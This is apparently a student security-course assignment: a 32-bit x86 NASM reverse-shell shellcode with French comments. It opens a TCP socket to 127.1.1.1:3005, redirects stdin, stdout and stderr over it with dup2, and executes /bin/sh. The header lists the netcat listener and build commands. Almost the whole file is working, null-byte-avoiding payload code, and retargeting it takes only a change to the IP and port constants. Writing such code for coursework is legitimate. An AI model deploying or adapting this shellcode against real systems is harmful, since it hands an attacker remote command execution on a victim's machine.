; NOM / Prénom : NEHME Ali - MEZANI Nazim
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;

section .text
    global _start

; nc -l -p 3005 -s 127.1.1.1
; nasm -f elf32 simple-shellcode.s && ld -m elf_i386 simple-shellcode.o && strace ./a.out

_start:

    ; pushad
    push 0x0101017f         ;; IP : 127.1.1.1
    push word 0xbd0b        ;; Port convertit en htons : 3005

    ;; Création de la socket
    sub eax, eax            ;; eax=0
    mov ax, 0x0167        ;; socket 
    xor edx, edx            ;; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
    mov ecx, edx            ;; ecx=0
    inc ecx                 ;; type : SOCK_STREAM (TCP)
    mov ebx, ecx            ;; ebx=1
    inc ebx                 ;; domaine : AF_INET (IPv4)
    push bx                 ;; ==========================> pour la fonction connexion AF_INET (connexion)
    int 0x80                ;; cd 80

    mov ebx, eax            ;; ebx=socket

    ;; Connexion
    mov ax, 0x16a           ;; connect
    mov ecx, esp            ;; Struct sockaddr *addr
    mov dl, 0x10            ;; size de sockaddr *addr
    int 0x80                ;; Création de la connexion (eax = 0 si tout s'est bien passé)

    push eax                ;; push 0 si connexion a été emise.
    push 0x68732f6e         ;; hs/n
    push 0x69622f2f         ;; ib//

    add al, 0x3            ;; Ajout de 3 dans eax pour la boucle du dup2
    mov ecx, eax            ;; Remplace tout le contenu du registre "ecx" par 0x3

    ;; Dup2 (duplication) pour stdin, stdout, stderr (redirige la stdin-stdout-stderr de la victime vers ma machine)
    not_finish_dup:         ;; jump ==> 0xff - 0x06 => 0xf9 (0x06 == nombre de caractères pour atteindre le label "not_finish_dup")
    mov al, 0x3f            ;; dup2
    dec ecx                 ;; stderr-stdout-stdin
    int 0x80                ;; 
    jnz not_finish_dup      ;; Si ecx != 0 => goto not_finish_dup

    ;; execve("/bin/sh", 0, 0) ==> eax=0x0b, ebx=/bin/sh, ecx=0, edx=0
    mov eax, ecx            ;; eax=0
    mov dl, 0x0b            ;; edx=0x0b
    xchg eax, edx           ;; eax=0x0b,edx=0       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 
    mov ebx, esp            ;; ebx=/bin/sh
    int 0x80                ;; 

    ; popad